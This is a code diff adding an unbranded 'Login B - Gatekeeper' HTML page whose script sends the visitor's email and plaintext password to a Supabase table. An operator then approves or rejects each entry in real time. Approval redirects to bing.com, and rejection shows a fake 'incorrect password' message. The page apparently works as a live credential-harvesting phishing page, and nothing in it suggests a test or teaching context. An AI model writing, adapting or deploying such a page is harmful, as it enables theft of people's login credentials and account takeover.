@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login B - Gatekeeper</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { 
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
+      background: #0a0a0f; 
+      color: #e8e8ec; 
+      min-height: 100vh; 
+      display: flex; 
+      align-items: center; 
+      justify-content: center; 
+    }
+    .form-card { 
+      background: #16161f; 
+      padding: 2.5rem; 
+      border-radius: 12px; 
+      width: 100%; 
+      max-width: 340px; 
+      box-shadow: 0 4px 20px rgba(0,0,0,0.4); 
+    }
+    h2 { text-align: center; margin-bottom: 1.5rem; color: #fff; }
+    .form-group { margin-bottom: 1.2rem; }
+    label { display: block; margin-bottom: 0.5rem; font-size: 0.85rem; color: #888; }
+    input { 
+      width: 100%; 
+      padding: 0.75rem 1rem; 
+      background: #2a2a3a; 
+      border: 1px solid #3a3a4a; 
+      border-radius: 8px; 
+      color: #fff; 
+      font-size: 1rem; 
+      outline: none; 
+      transition: border-color 0.2s; 
+    }
+    input:focus { border-color: #3b82f6; }
+    button { 
+      width: 100%; 
+      padding: 0.85rem 1rem; 
+      background: #3b82f6; 
+      color: #fff; 
+      border: none; 
+      border-radius: 8px; 
+      font-size: 1rem; 
+      font-weight: 600; 
+      cursor: pointer; 
+      margin-top: 1rem; 
+      transition: background 0.2s; 
+      position: relative;
+    }
+    button.loading { 
+      pointer-events: none; 
+      opacity: 0.7; 
+    }
+    button.loading::after { 
+      content: ''; 
+      width: 20px; 
+      height: 20px; 
+      border: 3px solid rgba(255,255,255,0.3); 
+      border-radius: 50%; 
+      border-top-color: #fff; 
+      position: absolute; 
+      top: 50%; 
+      left: 50%; 
+      margin-top: -10px; 
+      margin-left: -10px; 
+      animation: spin 1s linear infinite; 
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .error { 
+      background: #ef4444; 
+      margin-top: 1rem; 
+      padding: 0.75rem; 
+      border-radius: 8px; 
+      text-align: center; 
+      color: #fff; 
+      display: none; 
+      font-size: 0.875rem; 
+    }
+    .error.show { display: block; }
+    .loading { 
+      pointer-events: none; 
+      opacity: 0.7; 
+    }
+  </style>
+</head>
+<body>
+  <div class="form-card">
+    <h2>Login B</h2>
+    <form id="login-form">
+      <div class="form-group">
+        <label for="email">Email</label>
+        <input type="email" id="email" required placeholder="you@email.com">
+      </div>
+      <div class="form-group">
+        <label for="password">Password</label>
+        <input type="password" id="password" required placeholder="••••••••">
+      </div>
+      <button type="submit">Submit Credentials</button>
+    </form>
+    <div class="error" id="error">Failed to submit request</div>
+  </div>
+
+  <script type="module">
+    import { supabase } from '../scripts/supabase.js';
+
+    const PAGE_NAME = 'Login B';
+    const REDIRECT_URL = 'https://bing.com';
+
+    const generateRequestId = () => crypto.randomUUID();
+
+    document.getElementById('login-form').addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      const requestId = generateRequestId();
+
+      // Show loading state
+      const button = e.target.querySelector('button');
+      button.classList.add('loading');
+      button.disabled = true;
+
+      const { error } = await supabase
+        .from('gate_requests')
+        .insert([{ 
+          request_id: requestId, 
+          page_name: PAGE_NAME, 
+          email, 
+          password, 
+          status: 'pending', 
+          redirect_url: REDIRECT_URL 
+        }]);
+
+      // Remove loading state
+      button.classList.remove('loading');
+      button.disabled = false;
+
+      if (error) {
+        document.getElementById('error').classList.add('show');
+        console.error('Submit error:', error);
+        document.getElementById('login-form').reset();
+        return;
+      }
+
+      const channel = supabase
+        .channel(`request_${requestId}`)
+        .on('postgres_changes', 
+          { event: '*', schema: 'public', table: 'gate_requests', filter: `request_id=eq.${requestId}` }, 
+          (payload) => {
+            const data = payload.new;
+            console.log('Realtime update:', data);
+
+            if (data.status === 'approved') {
+              window.location.href = data.redirect_url;
+            } else if (data.status === 'rejected') {
+              // Show incorrect credentials message and clear form
+              document.getElementById('error').textContent = 'Incorrect email or password. Please try again.';
+              document.getElementById('error').classList.add('show');
+              // Clear form fields
+              document.getElementById('login-form').reset();
+            }
+          }
+        )
+        .subscribe();
+
+      document.getElementById('login-form').reset();
+    });
+  </script>
+</body>
+</html>
